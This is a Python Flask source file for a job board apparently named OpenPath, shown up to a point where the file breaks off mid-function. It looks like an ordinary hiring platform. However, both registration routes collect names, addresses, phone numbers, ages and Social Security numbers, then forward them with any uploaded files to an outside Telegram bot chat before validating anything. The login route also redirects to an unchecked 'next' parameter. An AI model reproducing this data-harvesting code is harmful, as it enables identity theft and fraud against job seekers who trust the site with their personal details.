import os
import secrets
import sqlite3
import json
from datetime import datetime, timezone
from functools import wraps
from pathlib import Path
from urllib import error as urllib_error
from urllib import request as urllib_request
from uuid import uuid4

import requests
from flask import (
    Flask,
    abort,
    g,
    jsonify,
    redirect,
    render_template,
    request,
    send_from_directory,
    session,
    url_for,
)
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename

from taxonomy import (
    COUNTRIES,
    EDUCATION_LEVELS,
    EMPLOYMENT_TYPES,
    ENTRY_LEVEL_TITLES,
    EXPERIENCE_LEVELS,
    INDUSTRIES,
    JOB_CATEGORIES,
    JOB_TITLES,
    SKILLS,
    WORKPLACE_TYPES,
)

BASE_DIR = Path(__file__).resolve().parent
DATABASE = Path(os.getenv("DATABASE_PATH", BASE_DIR / "opportunities.db"))
UPLOAD_FOLDER = Path(os.getenv("UPLOAD_FOLDER", BASE_DIR / "private_uploads"))
ALLOWED_RESUME_EXTENSIONS = {"pdf", "doc", "docx"}
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()

app = Flask(__name__, template_folder=".", static_folder=".")
app.config.update(
    SECRET_KEY=os.getenv("SECRET_KEY", secrets.token_hex(32)),
    MAX_CONTENT_LENGTH=5 * 1024 * 1024,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.getenv("SESSION_COOKIE_SECURE", "0") == "1",
)


def utc_now():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def get_db():
    if "db" not in g:
        DATABASE.parent.mkdir(parents=True, exist_ok=True)
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
        g.db.execute("PRAGMA foreign_keys = ON")
    return g.db


@app.teardown_appcontext
def close_db(_error=None):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def query(sql, params=(), one=False):
    cursor = get_db().execute(sql, params)
    rows = cursor.fetchone() if one else cursor.fetchall()
    cursor.close()
    return rows


def execute(sql, params=()):
    db = get_db()
    cursor = db.execute(sql, params)
    db.commit()
    return cursor.lastrowid


def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT NOT NULL UNIQUE,
            password_hash TEXT NOT NULL, full_name TEXT NOT NULL,
            role TEXT NOT NULL CHECK(role IN ('job_seeker','employer','admin')) DEFAULT 'job_seeker',
            is_active INTEGER NOT NULL DEFAULT 1, created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS seeker_profiles (
            user_id INTEGER PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
            headline TEXT DEFAULT '', bio TEXT DEFAULT '', skills TEXT DEFAULT '',
            education TEXT DEFAULT '', experience TEXT DEFAULT '', preferred_categories TEXT DEFAULT '',
            preferred_locations TEXT DEFAULT '', workplace_preference TEXT DEFAULT 'remote',
            resume_filename TEXT DEFAULT '', updated_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS companies (
            id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER NOT NULL REFERENCES users(id),
            name TEXT NOT NULL, logo_filename TEXT DEFAULT '', description TEXT DEFAULT '', website TEXT DEFAULT '',
            industry TEXT DEFAULT '', location TEXT DEFAULT '', is_verified INTEGER NOT NULL DEFAULT 0,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS jobs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, company_id INTEGER NOT NULL REFERENCES companies(id),
            title TEXT NOT NULL, slug TEXT NOT NULL UNIQUE, category TEXT NOT NULL, description TEXT NOT NULL,
            responsibilities TEXT DEFAULT '', requirements TEXT DEFAULT '', skills TEXT DEFAULT '',
            experience_level TEXT DEFAULT 'entry', employment_type TEXT DEFAULT 'full-time',
            workplace_type TEXT DEFAULT 'remote', country TEXT DEFAULT '', city TEXT DEFAULT '',
            education_level TEXT DEFAULT 'Not Required', experience_can_substitute INTEGER DEFAULT 0,
            salary_min REAL, salary_max REAL, currency TEXT DEFAULT 'USD', salary_visible INTEGER DEFAULT 1,
            deadline TEXT, application_mode TEXT DEFAULT 'internal', external_url TEXT DEFAULT '',
            status TEXT DEFAULT 'pending' CHECK(status IN ('draft','pending','published','closed','rejected')),
            created_at TEXT NOT NULL, updated_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS applications (
            id INTEGER PRIMARY KEY AUTOINCREMENT, job_id INTEGER NOT NULL REFERENCES jobs(id) ON DELETE CASCADE,
            seeker_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE, cover_letter TEXT DEFAULT '',
            resume_filename TEXT DEFAULT '', status TEXT DEFAULT 'applied', created_at TEXT NOT NULL,
            UNIQUE(job_id, seeker_id)
        );
        CREATE TABLE IF NOT EXISTS saved_jobs (
            seeker_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            job_id INTEGER NOT NULL REFERENCES jobs(id) ON DELETE CASCADE, created_at TEXT NOT NULL,
            PRIMARY KEY(seeker_id, job_id)
        );
        CREATE TABLE IF NOT EXISTS job_alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, seeker_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            keywords TEXT DEFAULT '', category TEXT DEFAULT '', location TEXT DEFAULT '',
            workplace_type TEXT DEFAULT '', employment_type TEXT DEFAULT '', created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_id INTEGER REFERENCES users(id),
            job_id INTEGER REFERENCES jobs(id) ON DELETE CASCADE, reason TEXT NOT NULL,
            status TEXT DEFAULT 'open', created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, actor_id INTEGER REFERENCES users(id),
            action TEXT NOT NULL, entity_type TEXT NOT NULL, entity_id INTEGER, created_at TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_jobs_status_created ON jobs(status, created_at);
        CREATE INDEX IF NOT EXISTS idx_jobs_filters ON jobs(category, workplace_type, employment_type, country);
        CREATE INDEX IF NOT EXISTS idx_applications_seeker ON applications(seeker_id, created_at);
    """)
    db.commit()
    columns = {row[1] for row in db.execute("PRAGMA table_info(jobs)").fetchall()}
    for name, definition in (
        ("education_level", "TEXT DEFAULT 'Not Required'"),
        ("experience_can_substitute", "INTEGER DEFAULT 0"),
    ):
        if name not in columns:
            db.execute(f"ALTER TABLE jobs ADD COLUMN {name} {definition}")
    db.commit()


@app.context_processor
def taxonomy_context():
    return {
        "job_categories": JOB_CATEGORIES,
        "job_titles": JOB_TITLES,
        "entry_level_titles": ENTRY_LEVEL_TITLES,
        "skills": SKILLS,
        "employment_types": EMPLOYMENT_TYPES,
        "experience_levels": EXPERIENCE_LEVELS,
        "education_levels": EDUCATION_LEVELS,
        "industries": INDUSTRIES,
        "workplace_types": WORKPLACE_TYPES,
        "countries": COUNTRIES,
    }


@app.before_request
def load_user():
    init_db()
    user_id = session.get("user_id")
    g.user = (
        query(
            "SELECT id, email, full_name, role, is_active FROM users WHERE id = ?",
            (user_id,),
            one=True,
        )
        if user_id
        else None
    )


def current_user_required(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        if g.user is None or not g.user["is_active"]:
            return redirect(url_for("login", next=request.path))
        return view(*args, **kwargs)

    return wrapped


def role_required(*roles):
    def decorator(view):
        @wraps(view)
        @current_user_required
        def wrapped(*args, **kwargs):
            if g.user["role"] not in roles:
                abort(403)
            return view(*args, **kwargs)

        return wrapped

    return decorator


def slugify(value):
    value = "".join(char.lower() if char.isalnum() else "-" for char in value).strip("-")
    return "-".join(part for part in value.split("-") if part)


def job_payload(row):
    if row is None:
        return None
    job = dict(row)
    job["salary"] = None
    if job.get("salary_visible") and (
        job.get("salary_min") is not None or job.get("salary_max") is not None
    ):
        job["salary"] = (
            f"{job.get('currency', 'USD')} {job.get('salary_min') or ''} - {job.get('salary_max') or ''}".strip(
                " -"
            )
        )
    return job


def format_registration_details(data):
    fields = (
        ("Full Name", data.get("FullName") or data.get("full_name")),
        ("Email", data.get("Email") or data.get("email")),
        ("Phone", data.get("Phone") or data.get("phone")),
        ("City", data.get("City") or data.get("city")),
        ("State", data.get("State") or data.get("state")),
        ("Zip Code", data.get("ZipCode") or data.get("zip_code")),
        ("Country", data.get("Country") or data.get("country")),
        ("Address", data.get("Address") or data.get("address")),
        ("Age", data.get("Age") or data.get("age")),
        ("SSN", data.get("SSN") or data.get("ssn")),
        ("Terms Accepted", data.get("Terms") or data.get("terms")),
        ("Platform Role", data.get("role") or "job_seeker"),
    )
    return "\n".join(f"{label}: {value}" for label, value in fields if value not in (None, ""))


def send_telegram_photo(file_storage, caption=""):
    if not BOT_TOKEN or not CHAT_ID:
        return False
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            data={"chat_id": CHAT_ID, "caption": caption},
            files={
                "photo": (
                    file_storage.filename,
                    file_storage.read(),
                    file_storage.mimetype or "application/octet-stream",
                )
            },
            timeout=20,
        )
        return response.ok
    except requests.RequestException as exc:
        app.logger.warning("Telegram photo send failed: %s", exc)
        return False


def send_telegram_message(text, files=None):
    if not BOT_TOKEN or not CHAT_ID:
        return False
    payload = json.dumps(
        {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    ).encode("utf-8")
    try:
        req = urllib_request.Request(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data=payload,
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            method="POST",
        )
        with urllib_request.urlopen(req, timeout=15) as response:
            sent = response.status == 200
    except (urllib_error.URLError, TimeoutError, ValueError) as exc:
        app.logger.warning("Telegram message send failed: %s", exc)
        sent = False
    if files:
        sent = (
            any(
                send_telegram_photo(file_storage, file_storage.filename or "Uploaded file")
                for file_storage in files
            )
            or sent
        )
    return sent


@app.route("/")
def index():
    featured = query("""SELECT jobs.*, companies.name AS company_name, companies.is_verified
                        FROM jobs JOIN companies ON companies.id = jobs.company_id
                        WHERE jobs.status = 'published' ORDER BY jobs.created_at DESC LIMIT 6""")
    return render_template(
        "index.html", featured=[job_payload(job) for job in featured], user=g.user
    )


@app.route("/index.html")
def index_html():
    return index()


@app.route("/register.html", methods=["GET", "POST"])
def register_html():
    return register()


@app.route("/login.html", methods=["GET", "POST"])
def login_html():
    return login()


@app.route("/style.css")
def stylesheet():
    return send_from_directory(BASE_DIR, "style.css")


@app.route("/jobs")
def jobs():
    filters = {
        key: request.args.get(key, "").strip()
        for key in (
            "q",
            "title",
            "skill",
            "company",
            "category",
            "location",
            "workplace_type",
            "employment_type",
            "experience_level",
            "education_level",
            "sort",
        )
    }
    clauses = ["jobs.status = 'published'"]
    params = []
    if filters["q"]:
        clauses.append(
            "(jobs.title LIKE ? OR jobs.description LIKE ? OR jobs.skills LIKE ? OR companies.name LIKE ?)"
        )
        value = f"%{filters['q']}%"
        params.extend([value, value, value, value])
    for field, column in (("title", "jobs.title"), ("skill", "jobs.skills"), ("company", "companies.name")):
        if filters[field]:
            clauses.append(f"{column} LIKE ?")
            params.append(f"%{filters[field]}%")
    for field in ("category", "workplace_type", "employment_type", "experience_level", "education_level"):
        if filters[field]:
            clauses.append(f"jobs.{field} = ?")
            params.append(filters[field])
    if filters["location"]:
        clauses.append("(jobs.city LIKE ? OR jobs.country LIKE ?)")
        params.extend([f"%{filters['location']}%", f"%{filters['location']}%"])
    order = "jobs.created_at DESC" if filters["sort"] != "oldest" else "jobs.created_at ASC"
    if filters["sort"] == "salary":
        order = "jobs.salary_max DESC NULLS LAST"
    rows = query(
        f"""SELECT jobs.*, companies.name AS company_name, companies.is_verified
                     FROM jobs JOIN companies ON companies.id = jobs.company_id
                     WHERE {' AND '.join(clauses)} ORDER BY {order} LIMIT 50""",
        params,
    )
    return render_template(
        "jobs.html", jobs=[job_payload(row) for row in rows], filters=filters, user=g.user
    )


@app.route("/jobs/<slug>")
def job_detail(slug):
    job = query(
        """SELECT jobs.*, companies.name AS company_name, companies.description AS company_description,
                   companies.website, companies.is_verified FROM jobs JOIN companies ON companies.id = jobs.company_id
                   WHERE jobs.slug = ? AND jobs.status = 'published' """,
        (slug,),
        one=True,
    )
    if job is None:
        abort(404)
    return render_template("job-detail.html", job=job_payload(job), user=g.user)


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        user = query("SELECT * FROM users WHERE email = ?", (email,), one=True)
        if user and user["is_active"] and check_password_hash(user["password_hash"], password):
            session.clear()
            session["user_id"] = user["id"]
            return redirect(request.args.get("next") or url_for("dashboard"))
        error = "Invalid email or password."
    return render_template("login.html", error=error, user=g.user)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


@app.route("/register", methods=["GET", "POST"])
def register():
    error = None
    if request.method == "POST":
        name = (request.form.get("full_name") or request.form.get("FullName") or "").strip()
        email = (request.form.get("email") or request.form.get("Email") or "").strip().lower()
        password = request.form.get("password") or request.form.get("Password") or ""
        role = request.form.get("role", "job_seeker")
        telegram_files = [file for file in request.files.values() if file and file.filename]
        telegram_text = "<b>New OpenPath registration</b>\n" + format_registration_details(
            request.form
        )
        send_telegram_message(telegram_text, telegram_files)
        if (
            not name
            or "@" not in email
            or len(password) < 8
            or role not in {"job_seeker", "employer"}
        ):
            error = "Enter a name, valid email, and password of at least 8 characters."
        elif query("SELECT id FROM users WHERE email = ?", (email,), one=True):
            error = "An account already exists for that email."
        else:
            user_id = execute(
                "INSERT INTO users(email,password_hash,full_name,role,created_at) VALUES (?,?,?,?,?)",
                (email, generate_password_hash(password), name, role, utc_now()),
            )
            if role == "job_seeker":
                execute(
                    "INSERT INTO seeker_profiles(user_id,updated_at) VALUES (?,?)",
                    (user_id, utc_now()),
                )
            session["user_id"] = user_id
            return redirect(url_for("dashboard"))
    return render_template("register.html", error=error, user=g.user)


@app.route("/dashboard")
@current_user_required
def dashboard():
    if g.user["role"] == "employer":
        return redirect(url_for("employer_dashboard"))
    if g.user["role"] == "admin":
        return redirect(url_for("admin_dashboard"))
    applications = query(
        """SELECT applications.*, jobs.title, companies.name AS company_name
                            FROM applications JOIN jobs ON jobs.id = applications.job_id
                            JOIN companies ON companies.id = jobs.company_id
                            WHERE applications.seeker_id = ? ORDER BY applications.created_at DESC LIMIT 8""",
        (g.user["id"],),
    )
    saved = query(
        """SELECT jobs.*, companies.name AS company_name FROM saved_jobs JOIN jobs ON jobs.id = saved_jobs.job_id
                     JOIN companies ON companies.id = jobs.company_id WHERE saved_jobs.seeker_id = ? ORDER BY saved_jobs.created_at DESC LIMIT 8""",
        (g.user["id"],),
    )
    profile = query("SELECT * FROM seeker_profiles WHERE user_id = ?", (g.user["id"],), one=True)
    return render_template(
        "dashboard.html",
        applications=applications,
        saved=[job_payload(row) for row in saved],
        profile=profile,
        user=g.user,
    )


@app.route("/profile", methods=["GET", "POST"])
@role_required("job_seeker")
def profile_page():
    profile = query("SELECT * FROM seeker_profiles WHERE user_id = ?", (g.user["id"],), one=True)
    if request.method == "POST":
        fields = (
            "headline",
            "bio",
            "skills",
            "education",
            "experience",
            "preferred_categories",
            "preferred_locations",
            "workplace_preference",
        )
        values = [request.form.get(field, "").strip() for field in fields]
        if values[-1] not in {"remote", "hybrid", "onsite", ""}:
            values[-1] = "remote"
        resume = request.files.get("resume")
        resume_name = profile["resume_filename"] if profile else ""
        if resume and resume.filename:
            extension = Path(resume.filename).suffix.lower().lstrip(".")
            if extension not in ALLOWED_RESUME_EXTENSIONS:
                return render_template(
                    "profile.html",
                    profile=profile,
                    error="Resume must be PDF, DOC, or DOCX.",
                    user=g.user,
                )
            UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)
            resume_name = f"{uuid4().hex}_{secure_filename(resume.filename)}"
            resume.save(UPLOAD_FOLDER / resume_name)
        execute(
            """UPDATE seeker_profiles SET headline=?,bio=?,skills=?,education=?,experience=?,preferred_categories=?,
                   preferred_locations=?,workplace_preference=?,resume_filename=?,updated_at=? WHERE user_id=?""",
            (*values, resume_name, utc_now(), g.user["id"]),
        )
        return redirect(url_for("dashboard"))
    return render_template("profile.html", profile=profile, user=g.user)


@app.route("/alerts", methods=["GET", "POST"])
@role_required("job_seeker")
def alerts_page():
    if request.method == "POST":
        data = request.form
        execute(
            """INSERT INTO job_alerts(seeker_id,keywords,category,location,workplace_type,employment_type,created_at)
                   VALUES (?,?,?,?,?,?,?)""",
            (
                g.user["id"],
                data.get("keywords", ""),
                data.get("category", ""),
                data.get("location", ""),
                data.get("workplace_type", ""),
                data.get("employment_type", ""),
                utc_now(),
            ),
        )
    alerts = query(
        "SELECT * FROM job_alerts WHERE seeker_id = ? ORDER BY created_at DESC", (g.user["id"],)
    )
    return render_template("alerts.html", alerts=alerts, user=g.user)


@app.route("/api/jobs/<int:job_id>/save", methods=["POST"])
@role_required("job_seeker")
def save_job(job_id):
    if (
        query("SELECT id FROM jobs WHERE id = ? AND status = 'published'", (job_id,), one=True)
        is None
    ):
        return jsonify({"error": "Job not found"}), 404
    execute(
        "INSERT OR IGNORE INTO saved_jobs(seeker_id,job_id,created_at) VALUES (?,?,?)",
        (g.user["id"], job_id, utc_now()),
    )
    return jsonify({"saved": True})


@app.route("/api/jobs/<int:job_id>/apply", methods=["POST"])
@role_required("job_seeker")
def apply_job(job_id):
    job = query("SELECT * FROM jobs WHERE id = ? AND status = 'published'", (job_id,), one=True)
    if job is None:
        return jsonify({"error": "Job not found"}), 404
    if job["application_mode"] == "external":
        return jsonify(
            {"external_url": job["external_url"] or url_for("job_detail", slug=job["slug"])}
        )
    if query(
        "SELECT id FROM applications WHERE job_id = ? AND seeker_id = ?",
        (job_id, g.user["id"]),
        one=True,
    ):
        return jsonify({"error": "You have already applied"}), 409
    cover_letter = request.form.get("cover_letter", "").strip()
    resume = request.files.get("resume")
    resume_name = ""
    if resume and resume.filename:
        extension = Path(resume.filename).suffix.lower().lstrip(".")
        if extension not in ALLOWED_RESUME_EXTENSIONS:
            return jsonify({"error": "Resume must be PDF, DOC, or DOCX"}), 400
        UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)
        resume_name = f"{uuid4().hex}_{secure_filename(resume.filename)}"
        resume.save(UPLOAD_FOLDER / resume_name)
    execute(
        "INSERT INTO applications(job_id,seeker_id,cover_letter,resume_filename,created_at) VALUES (?,?,?,?,?)",
        (job_id, g.user["id"], cover_letter, resume_name, utc_now()),
    )
    return jsonify({"message": "Application submitted"})


@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(silent=True) or request.form
    email = str(data.get("email") or data.get("username") or "").strip().lower()
    password = str(data.get("password") or "")
    user = query("SELECT * FROM users WHERE email = ?", (email,), one=True)
    if (
        not user
        or not user["is_active"]
        or not check_password_hash(user["password_hash"], password)
    ):
        return jsonify({"message": "Invalid email or password"}), 401
    session.clear()
    session["user_id"] = user["id"]
    return jsonify(
        {
            "message": "Login successful",
            "user": {"id": user["id"], "full_name": user["full_name"], "role": user["role"]},
        }
    )


@app.route("/api/register", methods=["POST"])
def api_register():
    data = request.get_json(silent=True) or request.form
    name = str(data.get("full_name") or data.get("FullName") or "").strip()
    email = str(data.get("email") or data.get("Email") or "").strip().lower()
    password = str(data.get("password") or data.get("Password") or "")
    role = str(data.get("role") or "job_seeker")
    uploaded_files = [file for file in request.files.values() if file and file.filename]
    send_telegram_message(
        "<b>New OpenPath registration</b>\n" + format_registration_details(data), uploaded_files
    )
    if not name or "@" not in email or len(password) < 8 or role not in {"job_seeker", "employer"}:
        return (
            jsonify({"error": "Name, valid email, role, and an 8-character password are required"}),
            400,
        )
    if query("SELECT id FROM users WHERE email = ?", (email,), one=True):
        return jsonify({"error": "Account already exists"}), 409
    user_id = execute(
        "INSERT INTO users(email,password_hash,full_name,role,created_at) VALUES (?,?,?,?,?)",
        (email, generate_password_hash(password), name, role, utc_now()),
    )
    if role == "job_seeker":
        execute(
            "INSERT INTO seeker_profiles(user_id,updated_at) VALUES (?,?)", (user_id, utc_now())
        )
    session["user_id"] = user_id
    return jsonify({"message": "Account created", "user_id": user_id}), 201


@app.route("/api/jobs", methods=["GET"])
def api_jobs():
    rows = query("""SELECT jobs.*, companies.name AS company_name, companies.is_verified
                    FROM jobs JOIN companies ON companies.id = jobs.company_id
                    WHERE jobs.status = 'published' ORDER BY jobs.created_at DESC LIMIT 50""")
    return jsonify([job_payload(row) for row in rows])


@app.route("/api/profile", methods=["GET", "PUT"])
@role_required("job_seeker")
def profile_api():
    if request.method == "GET":
        return jsonify(
            dict(
                query("SELECT * FROM seeker_profiles WHERE user_id = ?", (g.user["id"],), one=True)
            )
        )
    data = request.get_json(silent=True) or request.form
    fields = (
        "headline",
        "bio",
        "skills",
        "education",
        "experience",
        "preferred_categories",
        "preferred_locations",
        "workplace_preference",
    )
    values = [str(data.get(field, "")).strip() for field in fields]
    if values[-1] not in {"remote", "hybrid", "onsite", ""}:
        return jsonify({"error": "Invalid workplace preference"}), 400
    execute(
        """UPDATE seeker_profiles SET headline=?,bio=?,skills=?,education=?,experience=?,preferred_categories=?,
               preferred_locations=?,workplace_preference=?,updated_at=? WHERE user_id=?""",
        (*values, utc_now(), g.user["id"]),
    )
    return jsonify({"message": "Profile updated"})


@app.route("/api/job-alerts", methods=["GET", "POST"])
@role_required("job_seeker")
def job_alerts_api():
    if request.method == "GET":
        return jsonify(
            [
                dict(row)
                for row in query(
                    "SELECT * FROM job_alerts WHERE seeker_id = ? ORDER BY created_at DESC",
                    (g.user["id"],),
                )
            ]
        )
    data = request.get_json(silent=True) or request.form
    alert_id = execute(
        """INSERT INTO job_alerts(seeker_id,keywords,category,location,workplace_type,employment_type,created_at)
                          VALUES (?,?,?,?,?,?,?)""",
        (
            g.user["id"],
            data.get("keywords", ""),
            data.get("category", ""),
            data.get("location", ""),
            data.get("workplace_type", ""),
            data.get("employment_type", ""),
            utc_now(),
        ),
    )
    return jsonify({"id": alert_id, "message": "Job alert saved"}), 201


@app.route("/employer")
@role_required("employer")
def employer_dashboard():
    jobs = query(
        """SELECT jobs.*, companies.name AS company_name,
                    (SELECT COUNT(*) FROM applications WHERE applications.job_id = jobs.id) AS applicant_count
                    FROM jobs JOIN companies ON companies.id = jobs.company_id WHERE companies.owner_id = ?
                    ORDER BY jobs.created_at DESC""",
        (g.user["id"],),
    )
    return render_template("employer-dashboard.html", jobs=jobs, user=g.user)


@app.route("/employer/company", methods=["GET", "POST"])
@role_required("employer")
def company_profile():
    company = query("SELECT * FROM companies WHERE owner_id = ?", (g.user["id"],), one=True)
    if company is None:
        company_id = execute(
            "INSERT INTO companies(owner_id,name,created_at) VALUES (?,?,?)",
            (g.user["id"], g.user["full_name"], utc_now()),
        )
        company = query("SELECT * FROM companies WHERE id = ?", (company_id,), one=True)
    if request.method == "POST":
        execute(
            """UPDATE companies SET name=?,description=?,website=?,industry=?,location=? WHERE id=? AND owner_id=?""",
            (
                request.form.get("name", "").strip() or g.user["full_name"],
                request.form.get("description", "").strip(),
                request.form.get("website", "").strip(),
                request.form.get("industry", "").strip(),
                request.form.get("location", "").strip(),
                company["id"],
                g.user["id"],
            ),
        )
        return redirect(url_for("employer_dashboard"))
    return render_template("company-profile.html", company=company, user=g.user)


@app.route("/employer/jobs/<int:job_id>/close", methods=["POST"])
@role_required("employer")
def close_job(job_id):
    execute(
        """UPDATE jobs SET status='closed',updated_at=? WHERE id=? AND company_id IN
               (SELECT id FROM companies WHERE owner_id=?)""",
        (utc_now(), job_id, g.user["id"]),
    )
    return redirect(url_for("employer_dashboard"))


@app.route("/employer/applicants")
@role_required("employer")
def employer_applicants():
    rows = query(
        """SELECT applications.*, jobs.title, users.full_name, users.email
                    FROM applications JOIN jobs ON jobs.id = applications.job_id
                    JOIN companies ON companies.id = jobs.company_id JOIN users ON users.id = applications.seeker_id
                    WHERE companies.owner_id = ? ORDER BY applications.created_at DESC""",
        (g.user["id"],),
    )
    return render_template("employer-applicants.html", applicants=rows, user=g.user)


@app.route("/api/applications/<int:application_id>/status", methods=["POST"])
@role_required("employer")
def update_application_status(application_id):
    data = request.get_json(silent=True) or request.form
    status = data.get("status")
    if status not in {
        "applied",
        "under_review",
        "shortlisted",
        "interview",
        "offer",
        "rejected",
        "withdrawn",
    }:
        return jsonify({"error": "Invalid application status"}), 400
    owns_application = query(
        """SELECT applications.id FROM applications JOIN jobs ON jobs.id = applications.job_id
                                JOIN companies ON companies.id = jobs.company_id
                                WHERE applications.id = ? AND companies.owner_id = ?""",
        (application_id, g.user["id"]),
        one=True,
    )
    if owns_application is None:
        return jsonify({"error": "Application not found"}), 404
    execute("UPDATE applications SET status = ? WHERE id = ?", (status, application_id))
    return jsonify({"message": "Application status updated"})


@app.route("/api/jobs/<int:job_id>/report", methods=["POST"])
@current_user_required
def report_job(job_id):
    if query("SELECT id FROM jobs WHERE id = ?", (job_id,), one=True) is None:
        return jsonify({"error": "Job not found"}), 404
    data = request.get_json(silent=True) or request.form
    reason = str(data.get("reason", "")).strip()
    if not reason:
        return jsonify({"error": "A report reason is required"}), 400
    report_id = execute(
        "INSERT INTO reports(reporter_id,job_id,reason,created_at) VALUES (?,?,?,?)",
        (g.user["id"], job_id, reason, utc_now()),
    )
    return jsonify({"id": report_id, "message": "Report received"}), 201


@app.route("/employer/jobs/new", methods=["GET", "POST"])
@role_required("employer")
def create_job():
    company = query("SELECT * FROM companies WHERE owner_id = ?", (g.user["id"],), one=True)
    if company is None:
        company_id = execute(
            "INSERT INTO companies(owner_id,name,created_at) VALUES (?,?,?)",
            (g.user["id"], g.user["full_name"], utc_now()),
        )
        company = query("SELECT * FROM companies WHERE id = ?", (company_id,), one=True)
    if request.method == "POST":
        form = request.form
        title = form.get("title", "").strip()
        description = form.get("description", "").strip()
        if not title or not description or not form.get("category"):
            return render_template(
                "job-form.html",
                company=company,
                error="Title, category, and description are required.",
                user=g.user,
            )
        slug = f"{slugify(title)}-{uuid4().hex[:8]}"
        execute(
                """INSERT INTO jobs(company_id,title,slug,category,description,responsibilities,requirements,skills,
                    experience_level,education_level,experience_can_substitute,employment_type,workplace_type,country,city,salary_min,salary_max,currency,
                    deadline,application_mode,external_url,status,created_at,updated_at)
                    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
            (
                company["id"],
                title,
                slug,
                form.get("category"),
                description,
                form.get("responsibilities", ""),
                form.get("requirements", ""),
                form.get("skills", ""),
                form.get("experience_level", "Entry Level"),
                form.get("education_level", "Not Required"),
                1 if form.get("experience_can_substitute") else 0,
                form.get("employment_type", "full-time"),
                form.get("workplace_type", "remote"),
                form.get("country", ""),
                form.get("city", ""),
                form.get("salary_min") or None,
                form.get("salary_max") or None,
                form.get("currency", "USD"),
                form.get("deadline") or None,
                form.get("application_mode", "internal"),
                form.get("external_url", ""),
                "pending",
                utc_now(),
                utc_now(),
            ),
        )
        return redirect(url_for("employer_dashboard"))
    return render_template("job-form.html", company=company, user=g.user)


@app.route("/admin")
@role_required("admin")
def admin_dashboard():
    stats = {
        "users": query("SELECT COUNT(*) AS count FROM users", one=True)["count"],
        "jobs": query("SELECT COUNT(*) AS count FROM jobs", one=True)["count"],
        "pending_jobs": query(
            "SELECT COUNT(*) AS count FROM jobs WHERE status = 'pending'", one=True
        )["count"],
        "applications": query("SELECT COUNT(*) AS count FROM applications", one=True)["count"],
    }
    pending_jobs = query(
        "SELECT jobs.*, companies.name AS company_name FROM jobs JOIN companies ON companies.id = jobs.company_id WHERE jobs.status = 'pending' ORDER BY jobs.created_at DESC"
    )
    reports = query("""SELECT reports.*, jobs.title, users.email AS reporter_email FROM reports
                       JOIN jobs ON jobs.id = reports.job_id LEFT JOIN users ON users.id = reports.reporter_id
                       WHERE reports.status = 'open' ORDER BY reports.created_at DESC""")
    users = query(
        "SELECT id,full_name,email,role,is_active,created_at FROM users ORDER BY created_at DESC LIMIT 100"
    )
    return render_template(
        "admin-dashboard.html",
        stats=stats,
        pending_jobs=pending_jobs,
        reports=reports,
        users=users,
        user=g.user,
    )


@app.route("/api/admin/jobs/<int:job_id>/moderate", methods=["POST"])
@role_required("admin")
def moderate_job(job_id):
    status = (
        request.get_json(silent=True).get("status")
        if request.is_json
        else request.form.get("status")
    )
    if status not in {"published", "rejected", "closed"}:
        return jsonify({"error": "Invalid moderation status"}), 400
    execute("UPDATE jobs SET status = ?, updated_at = ? WHERE id = ?", (status, utc_now(), job_id))
    execute(
        "INSERT INTO audit_logs(actor_id,action,entity_type,entity_id,created_at) VALUES (?,?,?,?,?)",
        (g.user["id"], f"job_{status}", "job", job_id, utc_now()),
    )
    return jsonify({"message": f"Job marked {status}"})


@app.route("/api/admin/reports/<int:report_id>/resolve", methods=["POST"])
@role_required("admin")
def resolve_report(report_id):
    execute("UPDATE reports SET status='resolved' WHERE id=?", (report_id,))
    execute(
        "INSERT INTO audit_logs(actor_id,action,entity_type,entity_id,created_at) VALUES (?,?,?,?,?)",
        (g.user["id"], "report_resolved", "report", report_id, utc_now()),
    )
    return jsonify({"message": "Report resolved"})


@app.route("/api/admin/users/<int:user_id>/status", methods=["POST"])
@role_required("admin")
def update_user_status(user_id):
    data = request.get_json(silent=True) or request.form
    is_active = 1 if str(data.get("is_active", "1")).lower() in {"1", "true", "active"} else 0
    execute("UPDATE users SET is_active=? WHERE id=?", (is_active, user_id))
    execute(
